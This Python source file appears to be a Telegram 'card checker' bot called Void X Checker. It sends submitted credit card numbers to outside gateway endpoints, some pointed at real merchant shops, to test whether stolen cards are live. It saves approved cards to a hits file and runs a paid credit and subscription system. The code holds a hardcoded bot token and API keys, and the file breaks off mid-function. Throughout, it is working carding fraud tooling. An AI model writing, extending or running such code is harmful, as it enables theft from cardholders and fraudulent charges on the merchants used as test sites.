import telebot
from telebot import types
import html  # ✅ For escaping unsafe characters
from datetime import datetime, timedelta, timezone
import psutil
import platform
import json
import io
import subprocess
import sys
import traceback
import re
from yt_dlp import YoutubeDL
import random
import string
import os
import threading
import schedule 
from faker import Faker
from faker.config import AVAILABLE_LOCALES
import time
import requests

# Initialize Telegram bot
bot = telebot.TeleBot("8657714077:AAHWesE493pZhVNkzti3VathaSBrZaYs05A")
FIREBASE_BASE_URL = 'https://void-checker-default-rtdb.firebaseio.com'

# Admin configuration
ADMIN_IDS = ["8340881349"]
HITS_GROUP_ID = -1003722652767  # Replace with your group ID
APPROVED_GROUPS = set()
MAX_CARDS_LIMIT = 10 # Default maximum cards allowed in /mchk and /msq
MAX_SUBSCRIBED_CARDS_LIMIT = 30  # Increased limit for subscribed users
MAX_VBV_LIMIT = 10  # Limit for VBV checks for non-subscribed users
DAILY_CREDITS = 100  # Daily credits for non-subscribed users

CC_GENERATOR_URL = "https://drlabapis.onrender.com/api/ccgenerator?bin={}&count={}"
SQ_API_URL = "https://square-void.onrender.com/gateway/stripesquare/key/void/cc/{}"# Square [0.2$]
B3_API_URL = ""
C15_API_URL = "http://54.193.42.56/api/checkout?cc={}"
VBV_API_URL = "https://api.voidapi.xyz/v2/vbv?&key=VDX-SHA2X-NZ0RS-O7HAM&card={}"
SS_API_URL = "" # stripe 22.7$
CC_API_URL = "https://suiii-hvjf.onrender.com/gate=site/key=voidboy/cc={}"  # site 1$
AH_API_URL = "https://authnet-api.onrender.com/gate=st5/key=darkwaslost/cc={}" # authnet 5$
SF_API_URL = "https://sf-10.onrender.com/gate=sf/key=voidboy/cc={}" # Stripe [10$]
SHOPIFY_API_URL = "https://autoshh.onrender.com/index.php?site=https://thefarmstandonrussellroad.myshopify.com&cc={}"
B4_API_URL = "https://kamalxd.com/bots/b3/b3.php?cc={}"
PP_API_URL = "" # paypal 2$
PY_API_URL = "" # PAYPAL [0.1$]
SVBV_API_URL = ""
BOT_START_TIME = time.time()

def read_firebase(path):
    url = f"{FIREBASE_BASE_URL}/{path}.json"
    try:
        res = requests.get(url)
        if res.status_code == 200:
            return res.json() or {}
    except:
        return {}
    return {}

def write_firebase(path, data):
    url = f"{FIREBASE_BASE_URL}/{path}.json"
    try:
        res = requests.put(url, json=data)
        return res.status_code == 200
    except:
        return False

def update_firebase(path, data):
    url = f"{FIREBASE_BASE_URL}/{path}.json"
    try:
        res = requests.patch(url, json=data)
        return res.status_code == 200
    except:
        return False


ADMINS_FILE = "admins.json"


def load_admins():
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, "r") as f:
            return set(json.load(f))
    return set(["8340881349"])  # fallback default

def save_admins():
    with open(ADMINS_FILE, "w") as f:
        json.dump(list(ADMIN_IDS), f)

# Load all data from Firebase at startup
USER_CREDITS = read_firebase("user_credits") or {}
SUBSCRIBED_USERS = read_firebase("subscribed_users") or {}
APPROVED_GROUPS = set(read_firebase("approved_groups") or {})
REDEEM_CODES = read_firebase("redeem_codes") or {}
BANNED_USERS = read_firebase("banned_users") or {}

# New way
APPROVED_GROUPS = set(read_firebase("approved_groups") or {})

# New way saving
write_firebase("approved_groups", list(APPROVED_GROUPS))

def get_remaining_credits(user_id):
    user_id_str = str(user_id)
    USER_CREDITS = read_firebase("user_credits")

    if user_id_str in USER_CREDITS:
        return USER_CREDITS[user_id_str].get('credits', DAILY_CREDITS)

    return DAILY_CREDITS


# Load user credits from Firebase
USER_CREDITS = {}

def load_user_credits():
    global USER_CREDITS
    USER_CREDITS = read_firebase("user_credits")

# Call this once at startup
load_user_credits()


# Load redeem codes
# New way
REDEEM_CODES = read_firebase("redeem_codes") or {}

# New way saving
write_firebase("redeem_codes", REDEEM_CODES)

# User flood control
USER_LAST_COMMAND = {}
USER_MASS_CHECK_COOLDOWN = {}

# Decline responses for B3
DECLINE_RESPONSES = [
    "Do Not Honor",
    "Closed Card",
    "Card Issuer Declined CVV",
    "Call Issuer. Pick Up Card.",
    "2108: Closed Card (51 : DECLINED)",
    "Processor Declined",
    "Credit card type is not accepted by this merchant account.",
    "Expired Card",
    "Transaction Not Allowed",
    "RISK: Retry this BIN later.",
    "CVV.",
    "Invalid postal code and cvv",
    "Cannot Authorize at this time (Policy)"
]

SUBSCRIBED_USERS = read_firebase("subscribed_users")

write_firebase("subscribed_users", SUBSCRIBED_USERS)

# Add these with other variables at the top
BANNED_USERS = {}
if os.path.exists('banned_users.json'):
    with open('banned_users.json', 'r') as f:
        BANNED_USERS = json.load(f)

def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        if response.status_code == 200:
            return response.json()
        return None
    except:
        return None

def generate_redeem_code():
    """Generate a random 10-digit redeem code starting with Dark-"""
    prefix = "Void-"
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=20))
    return prefix + suffix

def create_menu_buttons(active_button=None):
    markup = types.InlineKeyboardMarkup()
    markup.row_width = 2
    
    # Determine button texts based on active button
    gateway_text = "🔙 Home" if active_button == "gateway_commands" else "Gateway"
    admin_text = "🔙 Home" if active_button == "admin_commands" else "Admin"
    tools_text = "🔙 Home" if active_button == "tools_commands" else "Tools"
    charged_text = "🔙 Home" if active_button == "charged_commands" else "Charged"
    buy_text = "🔙 Home" if active_button == "buy_plans" else "Buy"
    
    markup.add(
        types.InlineKeyboardButton(gateway_text, callback_data="gateway_commands"),
        types.InlineKeyboardButton(admin_text, callback_data="admin_commands"),
        types.InlineKeyboardButton(tools_text, callback_data="tools_commands"),
        types.InlineKeyboardButton(charged_text, callback_data="charged_commands"),
        types.InlineKeyboardButton(buy_text, callback_data="buy_plans")
    )
    return markup

def show_main_menu(chat_id, message_id=None):
    welcome_text = """
𝑽𝒐𝒊𝒅 𝑿 𝑪𝒉𝒆𝒄𝒌𝒆𝒓...

This bot checks credit cards using Gateway.
"""
    image_url = f"https://i.ibb.co/BVLP7Dc/Chat-GPT-Image-Jun-25-2025-09-56-53-AM.png"
    try:
        bot.send_photo(chat_id, photo=image_url, caption=welcome_text, reply_markup=create_menu_buttons(), parse_mode='HTML')
    except Exception as e:
        bot.send_message(chat_id, welcome_text, reply_markup=create_menu_buttons(), parse_mode='HTML')


def is_user_subscribed(user_id):
    user_id_str = str(user_id)
    if user_id_str in SUBSCRIBED_USERS:
        expiry_date = datetime.strptime(SUBSCRIBED_USERS[user_id_str]['expiry'], "%Y-%m-%d")
        if datetime.now() <= expiry_date:
            return True
    return False

def check_flood_control(user_id):
    now = time.time()
    if user_id in USER_LAST_COMMAND:
        last_time = USER_LAST_COMMAND[user_id]
        if now - last_time < 8:  # 5 seconds flood control
            return False
    USER_LAST_COMMAND[user_id] = now
    return True

def check_mass_check_cooldown(user_id):
    now = time.time()
    if user_id in USER_MASS_CHECK_COOLDOWN:
        last_time = USER_MASS_CHECK_COOLDOWN[user_id]
        if now - last_time < 8:  # 8 seconds cooldown
            return False
    USER_MASS_CHECK_COOLDOWN[user_id] = now
    return True

def check_user_credits(user_id, required_credits):
    user_id_str = str(user_id)

    # Reset credits at midnight KSA time (UTC+3)
    utc_now = datetime.now(timezone.utc)
    ksa_now = utc_now + timedelta(hours=3)
    today = str(ksa_now.date())

    # Load from Firebase
    USER_CREDITS = read_firebase("user_credits")

    # Reset if new day or not found
    if user_id_str not in USER_CREDITS or USER_CREDITS[user_id_str].get('date') != today:
        USER_CREDITS[user_id_str] = {
            'date': today,
            'credits': DAILY_CREDITS
        }
        write_firebase("user_credits", USER_CREDITS)

    if USER_CREDITS[user_id_str]['credits'] >= required_credits:
        return True
    return False



def deduct_credits(user_id, amount):
    user_id_str = str(user_id)

    # Load current credits from Firebase
    USER_CREDITS = read_firebase("user_credits")

    if user_id_str in USER_CREDITS:
        USER_CREDITS[user_id_str]['credits'] -= amount
        if USER_CREDITS[user_id_str]['credits'] < 0:
            USER_CREDITS[user_id_str]['credits'] = 0  # Avoid negative credits

        # Save updated credits back to Firebase
        write_firebase("user_credits", USER_CREDITS)

def get_remaining_credits(user_id):
    user_id_str = str(user_id)
    USER_CREDITS = read_firebase("user_credits")

    if user_id_str in USER_CREDITS:
        return USER_CREDITS[user_id_str].get('credits', DAILY_CREDITS)

    return DAILY_CREDITS


def check_if_banned(user_id):
    user_id = str(user_id)
    if user_id in BANNED_USERS:
        if BANNED_USERS[user_id] > time.time():
            remaining = BANNED_USERS[user_id] - time.time()
            hours = int(remaining // 3600)
            minutes = int((remaining % 3600) // 60)
            return f"❌ You are restricted from using this bot!\nTime remaining: {hours}h {minutes}m"
        else:
            del BANNED_USERS[user_id]
            with open('banned_users.json', 'w') as f:
                json.dump(BANNED_USERS, f)
    return None

def save_admins():
    with open(ADMINS_FILE, "w") as f:
        json.dump(ADMIN_IDS, f)

def broadcast_redeem_codes(codes):
    """Broadcast redeem codes to all users and groups"""
    try:
        if not codes:
            print("No codes to broadcast")
            return False

        # Format the message with supported HTML tags
        codes_list = "\n".join([f"<code>{code}</code>" for code in codes])
        message = f"""
<b>🎉 𝗡𝗲𝘄 𝗥𝗲𝗱𝗲𝗲𝗺 𝗖𝗼𝗱𝗲𝘀 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲!</b>

✧ 𝘈𝘮𝘰𝘶𝘯𝘵 : {len(codes)} codes
✧ 𝘝𝘢𝘭𝘶𝘦: 10 credits each 
✧ 𝘝𝘢𝘭𝘪𝘥𝘪𝘵𝘺: 5 days

<code>{codes_list}</code>

<b>How to redeem:</b>
Use /redeem CODE
Example: <code>/redeem {random.choice(codes)}</code>
"""


        # Get all recipients
        recipients = get_broadcast_recipients()
        if not recipients:
            print("No recipients found for broadcast")
            return False

        success_count = 0
        fail_count = 0

        # Send to all recipients with rate limiting
        for recipient in recipients:
            try:
                # Convert to integer if it's a group ID (negative)
                chat_id = int(recipient) if recipient.lstrip('-').isdigit() else recipient
                bot.send_message(chat_id, message, parse_mode='HTML')
                success_count += 1
                time.sleep(0.3)  # Rate limiting to avoid flooding
            except Exception as e:
                print(f"Failed to send to {recipient}: {str(e)}")
                fail_count += 1
                continue

        print(f"Broadcast completed: {success_count} successful, {fail_count} failed")
        return True

    except Exception as e:
        print(f"Broadcast failed: {str(e)}")
        return False

def get_broadcast_recipients():
    """Get all users and groups that should receive broadcasts"""
    recipients = set()
    
    try:
        # Add all users with credits
        user_credits = read_firebase("user_credits") or {}
        recipients.update(str(uid) for uid in user_credits.keys() if uid)
        
        # Add subscribed users
        subscribed_users = read_firebase("subscribed_users") or {}
        recipients.update(str(uid) for uid in subscribed_users.keys() if uid)
        
        # Add approved groups (stored as strings)
        approved_groups = read_firebase("approved_groups") or []
        recipients.update(str(gid) for gid in approved_groups if gid)
        
        # Filter out any None or empty values
        return [r for r in recipients if r and (r.lstrip('-').isdigit() or r.startswith('@'))]
    
    except Exception as e:
        print(f"Error getting recipients: {str(e)}")
        return []
    
def notify_on_restart():
    message = "𝑽𝒐𝒊𝒅 𝑿 𝑪𝒉𝒆𝒄𝒌𝒆𝒓  Restarted Successfully.\nUse /ping to see my status."

    # Combine all known user and group IDs
    all_users = set(USER_CREDITS.keys()) | set(SUBSCRIBED_USERS.keys())
    
    all_groups = set()
    if os.path.exists('approved_groups.txt'):
        with open('approved_groups.txt', 'r') as f:
            all_groups.update(line.strip() for line in f.readlines())
    all_groups.update(APPROVED_GROUPS)

    # Notify users
    for user_id in all_users:
        try:
            bot.send_message(user_id, message)
        except Exception as e:
            print(f"[Notify] Failed to send to user {user_id}: {e}")

    # Notify groups
    for group_id in all_groups:
        try:
            bot.send_message(group_id, message)
        except Exception as e:
            print(f"[Notify] Failed to send to group {group_id}: {e}")

def handle_generate(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Invalid format. Use /generate number or .generate number")
            return
            
        try:
            num_keys = int(parts[1])
            if num_keys <= 0:
                bot.reply_to(message, "❌ Number of keys must be at least 1")
                return
            elif num_keys > 100:
                num_keys = 100
                bot.reply_to(message, "⚠️ Maximum 100 keys at a time. Generating 100 keys.")
        except ValueError:
            bot.reply_to(message, "❌ Please provide a valid number")
            return
            
        # Generate keys
        keys = []
        for _ in range(num_keys):
            key = generate_redeem_code()
            keys.append(key)
            
            # Store key with expiry (5 days from now)
            expiry_date = datetime.now() + timedelta(days=5)
            REDEEM_CODES[key] = {
                'value': 20,
                'expiry': expiry_date.strftime("%Y-%m-%d"),
                'used': False,
                'used_by': None,
                'used_date': None
            }
        
        # Save to Firebase
        write_firebase("redeem_codes", REDEEM_CODES)
            
        # Format the keys for display
        codes_list = "\n".join([f"<code>{key}</code>" for key in keys])
        response = f"""
<b>✅ Successfully Generated {num_keys} Redeem Codes!</b>

<code>{codes_list}</code>

<b>These codes are being broadcast to all users and groups...</b>
"""
        bot.reply_to(message, response, parse_mode='HTML')
        
        # Broadcast keys to all users and groups in background
        threading.Thread(target=broadcast_redeem_codes, args=(keys,)).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def check_new_api_cc(cc):
    try:
        # Normalize input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]

        # Validate minimum length
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format: Use CC|MM|YY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe Auth'
            }

        cc_num = lista[0]
        mm = lista[1].zfill(2)
        yy_raw = lista[2]
        cvv = lista[3]

        # Safe YY conversion
        if yy_raw.startswith("20") and len(yy_raw) == 4:
            yy = yy_raw[2:]
        elif len(yy_raw) == 2:
            yy = yy_raw
        else:
            yy = '00'

        # BIN info fallback
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'

        # BIN lookup
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception:
            pass

        # Final formatted card
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # API request
        try:
            response = requests.get(
                f"https://voidxstrnpe.onrender.com/gateway=as/key=void/site=riversidefirewood.com.au/cc={formatted_cc}",
                timeout=300
    )

            if response.status_code == 200:
                try:
                    data = response.json()
                    status = str(data.get('status', 'DECLINED')).upper()
                    message = str(data.get('response') or data.get('message') or 'Your card was declined.')
                except Exception:
                    status = 'ERROR'
                    message = 'Invalid response from API'
            else:
                status = 'ERROR'
                message = f"API error: {response.status_code}"

            # Final status normalization
            if 'APPROVED' in status:
                status = 'APPROVED'
                with open('HITS.txt', 'a') as hits:
                    hits.write(formatted_cc + '\n')
            elif 'DECLINED' in status:
                status = 'DECLINED'
            elif status not in ['APPROVED', 'DECLINED']:
                status = 'ERROR'

            return {
                'status': status,
                'card': formatted_cc,
                'message': message,
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Auth'
            }

        except Exception as e:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f"Request error: {str(e)}",
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Auth'
            }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"Input error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe Auth'
        }

def check_square_cc(cc):
    try:
        card = cc.replace('/', '|')
        lista = card.split("|")
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API
        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        try:
            response = requests.get(SQ_API_URL.format(formatted_cc), timeout=300)
            if response.status_code == 200:
                data = response.json()
                status = data.get('status', 'DECLINED').upper()
                message = data.get('response', 'Your card was declined.')
                
                if status == 'APPROVED':
                    with open('HITS.txt','a') as hits:
                        hits.write(card+'\n')
                
                return {
                    'status': status,
                    'card': card,
                    'message': message,
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Square [0.20$]'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': 'API Error',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Square [0.20$]'
                }
        except Exception as e:
            return {
                'status': 'ERROR',
                'card': card,
                'message': str(e),
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Square [0.20$]'
            }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': card,
            'message': 'Invalid Input',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Square [0.20$]'
        }

def check_b3_cc(cc):
    try:
        # Normalize input format (accept various separators and formats)
        card = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]
        
        # Validate we have all required parts
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format. Use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth'
            }
        
        cc_num = lista[0]
        mm = lista[1].zfill(2)  # Ensure 2-digit month (e.g., 3 becomes 03)
        yy_raw = lista[2]
        cvv = lista[3]
        
        # Normalize year to 4 digits - FIXED LOGIC
        if len(yy_raw) == 2:  # 2-digit year provided
            current_year_short = datetime.now().year % 100
            input_year = int(yy_raw)
            if input_year >= current_year_short - 10:  # Consider years within 10 years range
                yy = '20' + yy_raw  # 22 → 2022
            else:
                yy = '20' + yy_raw  # Default to 20xx for all 2-digit years
        elif len(yy_raw) == 4:  # 4-digit year provided
            yy = yy_raw
        else:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid year format (use YY or YYYY)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth'
            }
        
        # Validate card number length
        if not (13 <= len(cc_num) <= 19):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card number length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth'
            }
        
        # Validate month
        if not (1 <= int(mm) <= 12):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid month (1-12)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth'
            }
        
        # Validate CVV
        if not (3 <= len(cvv) <= 4):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid CVV length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth'
            }
        
        # Check expiration (using normalized values)
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return {
                'status': 'DECLINED',
                'card': f"{cc_num}|{mm}|{yy}|{cvv}",
                'message': 'Your card is expired',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth'
            }
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API - in perfect CC|MM|YYYY|CVV format
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(B3_API_URL.format(formatted_cc), headers=headers, timeout=180)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} - {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth'
                    }
                    
                status = data.get('status', 'Declined ❌')
                message = data.get('response', 'Your card was declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(formatted_cc+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error']):
                    return {
                        'status': 'DECLINED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': 'API Timeout (60s) - Server may be busy',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Braintree Premium Auth'
        }
def format_vbv_response(result, user_full_name, processing_time):
    status = result.get('status', 'DECLINED').upper()

    if status == "LIVE":
        header = "𝐋𝐢𝐯𝐞 ✅"
    elif status == "CHALLENGE":
        header = "𝐂𝐡𝐚𝐥𝐥𝐞𝐧𝐠𝐞 🔴"
    else:
        header = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

    # User status
    uid = str(result.get('user_id', ''))
    if uid == "7098912960":
        user_status = "Owner"
    elif uid in ADMIN_IDS:
        user_status = "Admin"
    elif uid.isdigit() and is_user_subscribed(int(uid)):
        user_status = "Premium"
    else:
        user_status = "Free"

    return f"""
┏━━━━━━━⍟
┃ {header}
┗━━━━━━━━━━━⊛

⌯ 𝗖𝗮𝗿𝗱
   ↳<code>{result.get('card', 'N/A')}</code>
⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲↣  <i>{result.get('gateway', 'VoidAPI v2')}</i> 
⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ <i>{result.get('message', 'No Response')}</i>

⌯ 𝗜𝗻𝗳𝗼↣ {result.get('brand', 'UNKNOWN')}
⌯ 𝐈𝐬𝐬𝐮𝐞𝐫↣ {result.get('type', 'UNKNOWN')}
⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲↣ {result.get('country', 'UNKNOWN 🌐')}

⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲↣ {user_full_name}[{user_status}]
⌯ 𝐁𝐨𝐭 𝐁𝐲↣⎯꯭𖣐᪵‌ ~ @spydil [OWNER]
⌯ 𝗧𝗶𝗺𝗲↣ {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
""".strip()
import requests
import urllib.parse
import time

def check_vbv_cc(cc: str):
    try:
        card = cc.strip().replace(" ", "")
        parts = card.split("|")
        if len(parts) < 4:
            return {
                "status": "DECLINED",      # ← changed to DECLINED so your template never crashes
                "message": "Invalid format → cc|mm|yy|cvv",
                "card": card,
                "brand": "UNKNOWN",
                "type": "UNKNOWN",
                "country": "UNKNOWN 🌐",
                "gateway": "VoidAPI v2"
            }

        ccnum, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        extra = f"|{parts[4]}" if len(parts) > 4 else ""

        if len(yy) == 4: yy = yy[2:]
        fullcard = f"{ccnum}|{mm}|{yy}|{cvv}{extra}"

        # Default values (prevents KeyError 100%)
        brand = "UNKNOWN"
        card_type = "UNKNOWN"
        country_full = "UNKNOWN 🌐"
        status = "DECLINED"
        message = "Unknown Response"

        encoded = urllib.parse.quote(fullcard)
        url = f"https://api.voidapi.xyz/v2/vbv?&key=VDX-SHA2X-NZ0RS-O7HAM&card={encoded}"
        headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 14)"}

        for _ in range(3):
            try:
                r = requests.get(url, headers=headers, timeout=45)
                if r.status_code == 200:
                    data = r.json()

                    if data.get("success") and "data" in data:
                        d = data["data"]

                        # BIN info from API (perfect)
                        brand = d.get("scheme", "UNKNOWN").upper()
                        card_type = f"{d.get('type','')} {d.get('level','')}".strip().upper() or "UNKNOWN"
                        country_full = f"{d.get('country','??')} {d.get('emoji','🌐')}".strip()

                        result = d.get("status", "").lower()

                        if "approved" in result or "cvv" in result or "success" in result:
                            status = "LIVE"
                            message = "Approved - CVV Match ✅"
                            open("HITS.txt", "a", encoding="utf-8").write(f"{fullcard} → LIVE ✓\n")

                        elif "challenge" in result or "3ds" in result:
                            status = "CHALLENGE"
                            message = "Challenge Required 🔴"
                            open("HITS.txt", "a", encoding="utf-8").write(f"{fullcard} → CHALLENGE 🔴\n")

                        else:
                            status = "DECLINED"
                            message = (d.get("status") or "Declined").title() + " ❌"
                            open("DECLINES.txt", "a", encoding="utf-8").write(f"{fullcard} → {d.get('status')}\n")
                    else:
                        # Old format fallback
                        raw = data.get("response") or data.get("status") or data.get("error") or "No Response"
                        txt = str(raw).lower()
                        if any(x in txt for x in ["approved","success","cvv match"]):
                            status, message = "LIVE", "Approved ✅"
                        elif any(x in txt for x in ["challenge","3ds","otp"]):
                            status, message = "CHALLENGE", "3DS Required 🔴"
                        else:
                            status, message = "DECLINED", str(raw) + " ❌"

                    # FINAL RETURN — 100% SAFE KEYS
                    return {
                        "status": status,
                        "message": message,
                        "card": fullcard,
                        "brand": brand,
                        "type": card_type,
                        "country": country_full,
                        "gateway": "VoidAPI v2"
                    }
            except:
                time.sleep(1)

        # If all retries fail
        return {
            "status": "DECLINED",
            "message": "API Timeout / Down",
            "card": fullcard,
            "brand": brand,
            "type": card_type,
            "country": country_full,
            "gateway": "VoidAPI v2"
        }

    except Exception as e:
        return {
            "status": "DECLINED",
            "message": f"Checker Error",
            "card": cc,
            "brand": "UNKNOWN",
            "type": "UNKNOWN",
            "country": "UNKNOWN 🌐",
            "gateway": "VoidAPI v2"
        }

def check_cc_cc(cc):
    try:
        card = cc.replace('/', '|')
        lista = card.split("|")
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API
